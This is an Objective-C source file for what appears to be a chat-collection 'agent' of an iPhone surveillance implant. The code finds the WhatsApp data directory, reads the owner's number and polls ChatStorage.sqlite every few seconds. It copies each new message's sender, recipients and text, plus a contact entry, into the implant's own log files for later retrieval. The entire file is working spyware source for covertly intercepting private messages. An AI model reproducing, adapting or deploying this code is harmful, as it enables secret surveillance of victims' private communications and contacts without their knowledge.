//
//  RCSIAgentChat.m
//  RCSIphone
//
//  Created by armored on 7/25/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "RCSIAgentChat.h"
#import "RCSILogManager.h"
#import "RCSIUtils.h"
#import "RCSIAgentAddressBook.h"
#import "RCSILogManager.h"

#define USER_APPLICATIONS_PATH @"/private/var/mobile/Applications"
#define k_i_AgentChatRunLoopMode @"k_i_AgentChatRunLoopMode"
#define CHAT_TIMEOUT 3
#define LOG_DELIMITER 0xABADC0DE

#define ZMEMBERJID_POS    0
#define ZTEXT_POS         0
#define ZISFROMME_POS     1
#define ZGROUPMEMBER_POS  2
#define ZFROMJID_POS      3
#define ZTOJID_POS        4
#define Z_PK_POS          5
#define ZCHATSESSION_POS  6

static BOOL gWahtAppContactGrabbed = NO;

@implementation _i_AgentChat

#pragma mark -
#pragma mark - Initialization
#pragma mark -

- (id)init
{
    self = [super init];
    if (self)
    {
      mLastMsgPK = 0;
      mAgentID = AGENT_IM;
      mWADbPathName = nil;
      mWAUsername = @"";
    }
    
    return self;
}

#pragma mark -
#pragma mark Support methods
#pragma mark -

- (void)getProperties
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSString *chatClassKey = [[self class] description];
  
  NSDictionary *tmpDict = [[_i_Utils sharedInstance] getPropertyWithName: chatClassKey];
  
  if (tmpDict != nil)
  {
    NSNumber *tmplaskpk = [tmpDict objectForKey: @"lastpk"];
    
    if (tmplaskpk != nil)
    {
      mLastMsgPK = [tmplaskpk intValue];
    }
  }
  
  [pool release];
}

- (void)setProperties
{
  NSNumber *tmpLastPK = [NSNumber numberWithInt: mLastMsgPK];
  NSString *chatClassKey = [[self class] description];
  
  NSDictionary *tmpDict = [NSDictionary dictionaryWithObjectsAndKeys: tmpLastPK, @"lastpk", nil];
//  NSDictionary *dict    = [NSDictionary dictionaryWithObjectsAndKeys: tmpDict, chatClassKey, nil];
  
  [[_i_Utils sharedInstance] setPropertyWithName: chatClassKey withDictionary: tmpDict];
}

- (NSString*)getWARootPathName
{
  NSString *rootPath = nil;
  
  NSArray *usrAppFirstLevelPath =
    [[NSFileManager defaultManager] contentsOfDirectoryAtPath:USER_APPLICATIONS_PATH
                                                        error:nil];
  
  if (usrAppFirstLevelPath == nil || [self isThreadCancelled] == TRUE)
    return  rootPath;
  
  for (int i=0; i < [usrAppFirstLevelPath count]; i++)
  {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    if ([self isThreadCancelled] == TRUE)
    {
      [pool release];
      return  rootPath;
    }
    
    NSString *tmpPath = [NSString stringWithFormat:@"%@/%@/WhatsApp.app",
                         USER_APPLICATIONS_PATH,
                         [usrAppFirstLevelPath objectAtIndex:i]];
    
    if ([[NSFileManager defaultManager] fileExistsAtPath: tmpPath] == TRUE)
    {
      rootPath = [NSString stringWithFormat:@"%@/%@",
                                            USER_APPLICATIONS_PATH,
                                            [usrAppFirstLevelPath objectAtIndex:i]];
      
      if ([[NSFileManager defaultManager] fileExistsAtPath: rootPath] == FALSE)
      {
        //[rootPath release];
        rootPath = nil;
      }
      else
      {
        [rootPath retain];
        [pool release];
        break;
      }
    }
    
    [pool release];
  }
  
  return rootPath;
}

- (NSString*)getWAPhoneNumber:(NSString*)aContatNum
{
  NSRange rng = [aContatNum rangeOfString: @"@"];
  
  if (rng.location != NSNotFound)
    return [aContatNum substringToIndex: rng.location];
  else
    return aContatNum;
}

- (void)setWAUserName
{
  if ([self isThreadCancelled] == TRUE || [mWAUsername length] > 0)
    return;
  
  NSString *rootPath = [self getWARootPathName];
  
  if (rootPath != nil)
  {
    NSString *WAPrefsPath =
      [NSString stringWithFormat:@"%@/Library/Preferences/net.whatsapp.WhatsApp.plist",
                                 rootPath];
    [rootPath release];
    
    NSDictionary *prefs = [NSDictionary dictionaryWithContentsOfFile: WAPrefsPath];
    
    if (prefs != nil && [prefs objectForKey: @"OwnJabberID"] != nil)
    {
      NSString *tmpWAUsername = [prefs objectForKey: @"OwnJabberID"];
      
      mWAUsername = [[NSString alloc] initWithString: [self getWAPhoneNumber: tmpWAUsername]];
    }
  }
}

- (BOOL)setWADbPathName
{
  BOOL bRet = FALSE;
     
  if ([self isThreadCancelled] == TRUE) 
    return  FALSE;
    
  if (mWADbPathName != nil)
    return TRUE;
  
  NSString *rootPath = [self getWARootPathName];
    
  if (rootPath != nil)
  {
    mWADbPathName = [[NSString alloc] initWithFormat:@"%@/Documents/ChatStorage.sqlite",
                                                   rootPath];
    
    [rootPath release];
    
    if ([[NSFileManager defaultManager] fileExistsAtPath: mWADbPathName] == TRUE)
      bRet = TRUE;
    else
    {
      [mWADbPathName release];
      mWADbPathName = nil;
    }
  }

  return bRet;
}

- (void)logWhatsAppContacts:(NSString*)contact
{
  if (gWahtAppContactGrabbed == YES)
    return;
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  ABLogStrcut header;
  ABFile      abFile;
  ABContats   abContat;
  ABNumbers   abNumber;
  Names       abNames;
  
  // setting magic
  header.magic    = CONTACTLIST_2;
  abFile.magic    = CONTACTFILE;
  abContat.magic  = CONTACTCNT;
  abNumber.magic  = CONTACTNUM;
  abNames.magic   = CONTACTNAME;
  
  header.numRecords = 1;
  header.len        = 0xFFFFFFFF;
  
  NSData *firstData = [@"WhatsApp" dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
  
  // New contact
  abFile.len   = 0;
  
  abFile.flag = 0x80000001;
  
  NSMutableData *abData = [[NSMutableData alloc] initWithCapacity: 0];
  
  // Add header
  [abData appendBytes: (const void *) &header length: sizeof(header)];
  
  [abData appendBytes: (const void *) &abFile length: sizeof(abFile)];
  
  // FirstName abNames
  abNames.len = [firstData length];
  [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
  [abData appendBytes: (const void *) [firstData bytes]
               length: abNames.len];
  
  // LastName abNames
  abNames.len = [firstData length];
  [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
  [abData appendBytes: (const void *) [firstData bytes]
               length: abNames.len];
  
  // Telephone numbers
  abContat.numContats = 1;
  [abData appendBytes: (const void *) &abContat length: sizeof(abContat)];
  
  abNumber.type = 0;
  [abData appendBytes: (const void *) &abNumber length: sizeof(abNumber)];
  
  abNames.len = [contact lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
  [abData appendBytes: (const void *) [[contact dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]
               length: abNames.len];
  
  
  // Setting len of NSData - sizeof(magic)
  ABLogStrcut *logS = (ABLogStrcut *) [abData bytes];
  
  logS->len = [abData length] - (sizeof(logS->magic) + sizeof(logS->len));
  
  _i_LogManager *logManager = [_i_LogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOG_ADDRESSBOOK
                           agentHeader: nil
                             withLogID: 0xABCD];
  
  if (success == TRUE)
  {
    if ([logManager writeDataToLog: abData
                          forAgent: LOG_ADDRESSBOOK
                         withLogID: 0xABCD] == TRUE)
    {
      [logManager closeActiveLog: LOG_ADDRESSBOOK withLogID: 0xABCD];
    }
  }
  
  [abData release];
  
  [pool release];
  
  gWahtAppContactGrabbed = TRUE;
}

#pragma mark -
#pragma mark SQLITE3 stuff
#pragma mark -

- (void)closeWAChatDB:(sqlite3*)db
{
  if (db != NULL)
    sqlite3_close(db);
}

- (sqlite3*)openWAChatDB
{
  sqlite3 *db = NULL;
  
  if ([self isThreadCancelled] == TRUE || mWADbPathName == nil)
  {
    [self setMAgentStatus:AGENT_STATUS_STOPPED];
    return db;
  }
  
  sqlite3_open([mWADbPathName UTF8String], &db) ;
  
  return db;
}

- (NSString*)getSqlLiteString:(sqlite3_stmt*)compiledStatement
                       colNum:(int)column
{
  NSString *sqlStr = nil;
  
  if (sqlite3_column_text(compiledStatement, column) != NULL)
  {
    sqlStr =[NSString stringWithUTF8String:(char *)sqlite3_column_text(compiledStatement, column)];
  }
  else
  {
    sqlStr = [NSString stringWithUTF8String:" "];
  }
  
  return  sqlStr;
}

- (NSString*)getFromJIDFromGroup:(sqlite3_stmt*)aCompiledStat
                          fromDB:(sqlite3*)theDb
{
  NSString *from = nil;
  sqlite3_stmt *compiledStatement;
  char wa_msg_query[256];
  
  int zgrpmem = sqlite3_column_int(aCompiledStat, ZGROUPMEMBER_POS);
  
  char _wa_msg_query[] = "select ZMEMBERJID from ZWAGROUPMEMBER where Z_PK = ";
  sprintf(wa_msg_query, "%s %d", _wa_msg_query, zgrpmem);

  
  if(sqlite3_prepare_v2(theDb, wa_msg_query, -1, &compiledStatement, NULL) == SQLITE_OK)
  {
    if (sqlite3_step(compiledStatement) == SQLITE_ROW)
    {
      const unsigned char *tmpPeer = sqlite3_column_text(compiledStatement, ZMEMBERJID_POS);
      
      if (tmpPeer == NULL)
        from = [NSString stringWithUTF8String: " "];
      else
        from = [NSString stringWithUTF8String:(char *)tmpPeer];
    }
  }
  
  sqlite3_finalize(compiledStatement);
  
  return from;
}

- (NSString*)getFromJID:(sqlite3_stmt*)aCompiledStat
                 fromDB:(sqlite3*)theDb
{
  NSString *from = nil;
  
  // case 1: sender is me ZISFROMME = 1
  if (sqlite3_column_int(aCompiledStat, ZISFROMME_POS) == TRUE)
  {
    from = mWAUsername;
  }
  else
  {
    int zgrpmem = sqlite3_column_int(aCompiledStat, ZGROUPMEMBER_POS);
    
    // case 3: from member of group: ZFROMJID != nil && ZGROUPMEMBER != nil)
    if (zgrpmem != 0)
    {
      from = [self getFromJIDFromGroup: aCompiledStat fromDB: theDb];
    }
    else
    {
      // case 2: from a single user: (ZFROMJID != nil && ZGROUPMEMBER == nil)
      // case 4: from member of group: (ZFROMJID != nil && ZGROUPMEMBER == nil)
      const unsigned char *_from = sqlite3_column_text(aCompiledStat, ZFROMJID_POS);
      if (_from != NULL)
      {
        for (int i=0; i < strlen((char*)_from); i++)
        {
          if (_from[i] == '-')
          {
            char *ptr = (char*)_from + i;
            *ptr = 0;
            break;
          }
        }
        
        from = [NSString stringWithUTF8String:(char *)_from];
      }
      else
        from= [NSString stringWithUTF8String:" "]; 
    }
  }
  
  return [self getWAPhoneNumber: from];
}

- (BOOL)isAGroup:(NSString*)aName
{
  NSRange range = [aName rangeOfString:@"-"];
  
  if (range.location == NSNotFound)
    return FALSE;
  else
    return TRUE;
}

- (NSString*)getToJIDFromGroup:(sqlite3_stmt*)aCompiledStat
                        fromDB:(sqlite3*)theDb
                     excluding:(NSString*)aUserId
{
  NSString *to = nil;
  NSMutableString *_to = nil;
  NSString *tmpPeer;
  
  sqlite3_stmt *compiledStatement;
  char wa_msg_query[256];
  
  int zchtsess = sqlite3_column_int(aCompiledStat, ZCHATSESSION_POS);
  
  char _wa_msg_query[] = "select ZMEMBERJID from ZWAGROUPMEMBER where ZCHATSESSION = ";
  sprintf(wa_msg_query, "%s %d", _wa_msg_query, zchtsess);
  
  if(sqlite3_prepare_v2(theDb, wa_msg_query, -1, &compiledStatement, NULL) == SQLITE_OK)
  {
    if (sqlite3_step(compiledStatement) == SQLITE_ROW)
    {
      _to = [NSMutableString stringWithCapacity:0];
      
      const unsigned char *_tmpPeer = sqlite3_column_text(compiledStatement, ZMEMBERJID_POS);
      
      if (_tmpPeer != NULL)
        tmpPeer = [NSString stringWithUTF8String:(char *)_tmpPeer];
      else
        tmpPeer = [NSString stringWithUTF8String: " "];
      
      NSString *__tmpPeer = [self getWAPhoneNumber:tmpPeer];
      if ([__tmpPeer compare: aUserId] != NSOrderedSame)
        [_to appendString: __tmpPeer];
      
      while (sqlite3_step(compiledStatement) == SQLITE_ROW)
      {
        _tmpPeer = sqlite3_column_text(compiledStatement, ZMEMBERJID_POS);
        if (_tmpPeer != NULL)
          tmpPeer = [NSString stringWithUTF8String:(char *)_tmpPeer];
        else
          tmpPeer = [NSString stringWithUTF8String: " "];
        
        NSString *__tmpPeer = [self getWAPhoneNumber:tmpPeer];
        if ([__tmpPeer compare: aUserId] != NSOrderedSame)
        {
          [_to appendString:@","];
          [_to appendString:__tmpPeer];
        }
      }
    }
  }
  
  sqlite3_finalize(compiledStatement);
  
  if (_to != nil)
    to = [NSString stringWithString: _to];
  
  return to;
}

- (NSString*)getToJID:(sqlite3_stmt*)aCompiledStat
               fromDB:(sqlite3*)theDb
            excluding:(NSString*)theSender
{
  NSString *to = nil;
  NSString *_to = nil;
  
  const unsigned char *__to = sqlite3_column_text(aCompiledStat, ZTOJID_POS);
  
  if (__to != NULL)
    _to = [NSString stringWithUTF8String:(char *)__to];
  else
    _to = mWAUsername;
  
  // i'm the sender: rcpt should be a group or single user
  if (sqlite3_column_int(aCompiledStat, ZISFROMME_POS) == TRUE)
  {
    if ([self isAGroup:_to] == TRUE)
      to = [self getToJIDFromGroup:aCompiledStat fromDB:theDb excluding: theSender];
    else
      to = [self getWAPhoneNumber: _to];
  }
  else
  {
    // i'm the rcpt: if sender is a group the rcpt must be a group
    NSString *_fr;
    
    const unsigned char *__fr = sqlite3_column_text(aCompiledStat, ZFROMJID_POS);
    
    if (__fr != NULL)
      _fr = [NSString stringWithUTF8String:(char *)__fr];
    else
      _fr = [NSString stringWithUTF8String: " "];
    
    if ([self isAGroup:_fr] == TRUE)
      to = [self getToJIDFromGroup:aCompiledStat fromDB:theDb excluding: theSender];
    else
      to = [self getWAPhoneNumber: _to];
  }
  
  return to;
}

- (NSString*)getText:(sqlite3_stmt*)aCompiledStat
              fromDB:(sqlite3*)theDb
{
  NSString *text = nil;
  
  const unsigned char *_text = sqlite3_column_text(aCompiledStat, ZTEXT_POS);
  
  if (_text != NULL)
  {
    text = [self getSqlLiteString:aCompiledStat colNum:ZTEXT_POS];
  }
  
  return text;
}

- (NSMutableArray*)getWAChatMessagesFormDB:(sqlite3*)theDB
                                  withDate:(int)theDate
{
  NSMutableArray *retArray = [NSMutableArray arrayWithCapacity:0];
  char wa_msg_query[256];
  sqlite3_stmt *compiledStatement;
  
  char _wa_msg_query[] =
    "select ZTEXT, ZISFROMME, ZGROUPMEMBER, ZFROMJID, ZTOJID, Z_PK, ZCHATSESSION from ZWAMESSAGE where ZMESSAGEDATE >";

  sprintf(wa_msg_query, "%s %d", _wa_msg_query, theDate);
  
  if(sqlite3_prepare_v2(theDB, wa_msg_query, -1, &compiledStatement, NULL) == SQLITE_OK)
  {
    while(sqlite3_step(compiledStatement) == SQLITE_ROW)
    {
      int z_pk = sqlite3_column_int(compiledStatement, Z_PK_POS);
       
      if (z_pk > mLastMsgPK)
      {
        mLastMsgPK = z_pk;
        
        NSString *text = [self getText:compiledStatement fromDB:theDB];
        
        if (text != nil)
        {
          NSString *sndr = [self getFromJID:compiledStatement fromDB: theDB];
          NSString *peer = [self getToJID:compiledStatement fromDB:theDB excluding:sndr];
          
          NSDictionary *tmpDict = [NSDictionary dictionaryWithObjectsAndKeys:text, @"text",
                                                                             peer, @"peers",
                                                                             sndr, @"sender", nil];
          
          [retArray addObject: tmpDict];
      
        }
      }
    }
    
    sqlite3_finalize(compiledStatement);
  }
  
  return retArray;
}

#pragma mark -
#pragma mark Agent chat methods
#pragma mark -

/* old char version* - begin */
- (NSMutableData*)createWAChatLog:(NSString*)_sender
                        withPeers:(NSString*)_peers
                          andText:(NSString*)_text
{
  NSData *processName         = [@"WhatsApp" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *topic               = [@"-" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];  
  NSData *peers               = [_peers dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *content             = [_text dataUsingEncoding: NSUTF16LittleEndianStringEncoding];

  NSMutableData *entryData    = [NSMutableData dataWithCapacity:0];
  
  short unicodeNullTerminator = 0x0000;
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // Struct tm
  time (&rawtime);
  tmTemp = gmtime(&rawtime);
  
  tmTemp->tm_year += 1900;
  tmTemp->tm_mon  ++;
 
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  if (sizeof(long) == 4) // 32bit
  {
    [entryData appendBytes: (const void *)tmTemp
                    length: sizeof (struct tm) - 0x8];
  }
  else if (sizeof(long) == 8) // 64bit
  {
    [entryData appendBytes: (const void *)tmTemp
                    length: sizeof (struct tm) - 0x14];
  }
  
  // Process Name
  [entryData appendData: processName];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Topic
  [entryData appendData: topic];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Peers
  [entryData appendData: peers];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  // Content
  [entryData appendData: [_sender dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [entryData appendData: [@": " dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [entryData appendData: content];  
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  // Delimiter
  unsigned int del = LOG_DELIMITER;
  
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
  return entryData;
}
/* old char version* - end */

- (NSMutableData*)createNewWAChatLog:(NSString*)_sender
                           withPeers:(NSString*)_peers
                             andText:(NSString*)_text
{
  // Delimiter
  unsigned int del = LOG_DELIMITER;
  short unicodeNullTerminator = 0x0000;
  time_t rawtime;
  struct tm *tmTemp;
  int32_t programType = 0x00000006; // WhatsApp
  int32_t flags = 0x00000000;

  NSData *peers               = [_peers dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *content             = [_text dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  NSMutableData *entryData    = [NSMutableData dataWithCapacity:0];
  
  // Struct tm
  time (&rawtime);
  tmTemp = gmtime(&rawtime);
  
  tmTemp->tm_year += 1900;
  tmTemp->tm_mon  ++;
  
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  if (sizeof(long) == 4) // 32bit
  {
    [entryData appendBytes: (const void *)tmTemp
                    length: sizeof (struct tm) - 0x8];
  }
  else if (sizeof(long) == 8) // 64bit
  {
    [entryData appendBytes: (const void *)tmTemp
                    length: sizeof (struct tm) - 0x14];
  }

  if (_sender == mWAUsername)
    flags = 0x00000000;
  else
    flags = 0x00000001;
  
  // Program
  [entryData appendBytes: &programType length:sizeof(programType)];
  
  // Incoming/outcoming
  [entryData appendBytes: &flags length:sizeof(flags)];
  
  // From
  [entryData appendData: [_sender dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // From_to
  [entryData appendData: [_sender dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // to
  [entryData appendData: peers];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];

  // to_display
  [entryData appendData: peers];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Content
  [entryData appendData: content];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];

  // Delim
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
  return entryData;
}

- (void)writeWAChatLogs:(NSArray*)chatArray
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if ([chatArray count] == 0)
  {
    [pool release];
    return;
  }
  
  _i_LogManager *logManager = [_i_LogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOG_CHAT_NEW
                           agentHeader: nil
                             withLogID: 0];
  if (success == FALSE)
  {
    [pool release];
    return;
  }
  
  for (int i=0; i < [chatArray count]; i++)
  {
    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
    
    NSDictionary* tmpChat = [chatArray objectAtIndex:i];
    
    NSMutableData *tmpData = [self createNewWAChatLog:[tmpChat objectForKey:@"sender"]
                                            withPeers:[tmpChat objectForKey:@"peers"]
                                              andText:[tmpChat objectForKey:@"text"]];
    [logManager writeDataToLog: tmpData
                      forAgent: LOG_CHAT_NEW
                     withLogID: 0];
    
    [inner release];
  }
  
  [logManager closeActiveLog: LOG_CHAT_NEW
                   withLogID: 0];
  
  [self setProperties];
  
  [pool release];
}

- (NSMutableArray*)getWAChats
{
  sqlite3 *db;
  NSMutableArray *chatArray = nil;
  
  if ([self isThreadCancelled] == TRUE)
  {
    [self setMAgentStatus:AGENT_STATUS_STOPPED];
    return chatArray;
  }
  
  if ((db = [self openWAChatDB]) == NULL)
  {
    sqlite3_close(db);
    return chatArray;
  }
  chatArray = [self getWAChatMessagesFormDB: db withDate:0.0];
  
  [self closeWAChatDB: db];
  
  return chatArray;
}

- (void)getChat
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  NSMutableArray *waChats = nil;
  
  if ([self isThreadCancelled] == TRUE)
  {
    [self setMAgentStatus:AGENT_STATUS_STOPPED];
    [pool release];
    return;
  }
    
  waChats = [self getWAChats];

  [self writeWAChatLogs: waChats];
  
  [pool release];
}

- (void)setChatPollingTimeOut:(NSTimeInterval)aTimeOut 
{    
  NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: aTimeOut 
                                                    target: self 
                                                  selector: @selector(getChat) 
                                                  userInfo: nil 
                                                   repeats: YES];
  
  [[NSRunLoop currentRunLoop] addTimer: timer forMode: k_i_AgentChatRunLoopMode];
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (void)startAgent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  if ([self isThreadCancelled] == TRUE || [self setWADbPathName] == FALSE)
  {
    [self setMAgentStatus:AGENT_STATUS_STOPPED];
    [outerPool release];
    return;
  }
  
  [self setWAUserName];
  
  [self logWhatsAppContacts:mWAUsername];
  
  [self getProperties];
  
  [self setChatPollingTimeOut:CHAT_TIMEOUT];
  
  while ([self mAgentStatus] == AGENT_STATUS_RUNNING)
  {
    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
    [[NSRunLoop currentRunLoop] runMode: k_i_AgentChatRunLoopMode 
                             beforeDate: [NSDate dateWithTimeIntervalSinceNow: 1.00]];
    
    [innerPool release];
  }
  
  [self setMAgentStatus:AGENT_STATUS_STOPPED];
  
  [outerPool release];
}

- (BOOL)stopAgent
{
  [self setMAgentStatus: AGENT_STATUS_STOPPING];
  return YES;
}

- (BOOL)resume
{
  return YES;
}
@end


/*- (NSString*)getSender:(sqlite3_stmt*)compiledStatement
 {
 NSString *sqlString = nil;
 
 if (sqlite3_column_text(compiledStatement, 1) == NULL)
 {
 sqlString = mWAUsername;
 }
 else
 {
 sqlString = [self getSqlLiteString:compiledStatement colNum:1];
 }
 
 return [self getWAPhoneNumber: sqlString];
 }
 
 - (NSString*)getPeer:(sqlite3_stmt*)compiledStatement
 {
 NSString *sqlString = nil;
 
 const unsigned char *tmpPeer = sqlite3_column_text(compiledStatement, 2);
 
 if ( tmpPeer == NULL)
 {
 sqlString = mWAUsername;
 }
 else
 {
 sqlString = [self getSqlLiteString:compiledStatement colNum:2];
 if (sqlString == nil)
 sqlString = @" ";
 }
 
 return [self getWAPhoneNumber: sqlString];
 }
 
 - (NSString*)getPeerFromGroup:(int)theGroup andDB:(sqlite3*)theDB
 {
 NSString *sqlStr = [NSString stringWithUTF8String:" "];
 char wa_msg_query[256];
 
 char _wa_msg_query[] = "select ZMEMBERJID from ZWAGROUPMEMBER where Z_PK =";
 sprintf(wa_msg_query, "%s %d", _wa_msg_query, theGroup);
 
 sqlite3_stmt *compiledStatement;
 
 if(sqlite3_prepare_v2(theDB, wa_msg_query, -1, &compiledStatement, NULL) == SQLITE_OK)
 {
 if (sqlite3_step(compiledStatement) == SQLITE_ROW)
 {
 const unsigned char *tmpPeer = sqlite3_column_text(compiledStatement, 0);
 sqlStr =[NSString stringWithUTF8String:(char *)tmpPeer];
 }
 }
 
 sqlite3_finalize(compiledStatement);
 
 return sqlStr;
 }
 
 - (NSMutableArray*)getWAChatMessagesFormDB:(sqlite3*)theDB
 withDate:(int)theDate
 {
 NSMutableArray *retArray = [NSMutableArray arrayWithCapacity:0];
 
 char _wa_msg_query[] = "select ZTEXT, ZGROUPMEMBER, ZFROMJID, ZTOJID, Z_PK from ZWAMESSAGE where ZMESSAGEDATE >";
 char wa_msg_query[256];
 sprintf(wa_msg_query, "%s %d", _wa_msg_query, theDate);
 sqlite3_stmt *compiledStatement;
 
 if(sqlite3_prepare_v2(theDB, wa_msg_query, -1, &compiledStatement, NULL) == SQLITE_OK)
 {
 while(sqlite3_step(compiledStatement) == SQLITE_ROW)
 {
 int z_pk     = sqlite3_column_int(compiledStatement, 3);
 int z_grpmem = sqlite3_column_int(compiledStatement, 1);
 
 
 if (z_pk > mLastMsgPK)
 {
 mLastMsgPK = z_pk;
 NSString *text = [self getSqlLiteString:compiledStatement colNum:0];
 NSString *peer = [self getPeer:compiledStatement];
 NSString *sndr = [self getSender:compiledStatement];
 
 if (z_grpmem != SQLITE_NULL)
 {
 
 }
 
 NSDictionary *tmpDict = [NSDictionary dictionaryWithObjectsAndKeys:text, @"text",
 peer, @"peers",
 sndr, @"sender", nil];
 
 [retArray addObject: tmpDict];
 }
 }
 
 sqlite3_finalize(compiledStatement);
 }
 
 return retArray;
 }*/
